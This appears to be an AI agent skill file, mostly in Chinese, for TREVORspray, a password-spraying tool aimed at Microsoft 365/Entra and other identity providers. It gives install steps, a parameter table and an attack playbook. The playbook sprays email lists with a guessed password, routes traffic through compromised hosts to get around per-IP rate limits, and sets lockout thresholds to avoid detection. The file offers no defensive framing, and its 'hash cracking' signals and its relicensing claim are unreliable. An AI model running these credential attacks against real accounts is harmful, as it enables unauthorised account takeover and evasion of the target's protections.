---
name: trevorspray-cloud-spray
description: "TREVORspray performs proxy-pool O365 spraying. Signals: password cracking, hash cracking, custom IdP, SSH proxy-pool spraying, threads"
zh-signals: "TREVORspray: 代理池 O365 喷洒。信号:密码破解,哈希破解,自定义 IdP,SSH 代理池喷洒,线程。"
---

# TREVORspray

- 攻击大类:C25 口令与哈希破解
- 上游仓库:https://github.com/blacklanternsecurity/TREVORspray
- 上游 License:GPL-3.0(本 SKILL.md 以 Apache-2.0 二次开源,上游版权归原项目所有)

## 安装

```bash
pip install trevorspray
```

## 参数速查

| 参数 / 命令 | 说明 |
| --- | --- |
| `trevorspray --emails users.txt --passwords pass.txt` | O365 喷洒 |
| `--url https://login.target.com --usernames u.txt` | 自定义 IdP |
| `--ssh hosts.txt --key id_rsa` | SSH 代理池喷洒 |
| `-t 100` | 线程 |
| `--lockout-threshold 3` | 锁账号保护 |

## 攻击场景 Playbook

### 代理池 O365 喷洒

```bash
trevorspray --emails emails.txt --passwords Winter2024! --lockout-threshold 3
# 用被控主机做代理(--ssh),规避单 IP 限速
```

## 注意事项

Black Lantern 出品,喷射 O365/Entra 及各类 IdP,内置代理池和智能锁账号规避。
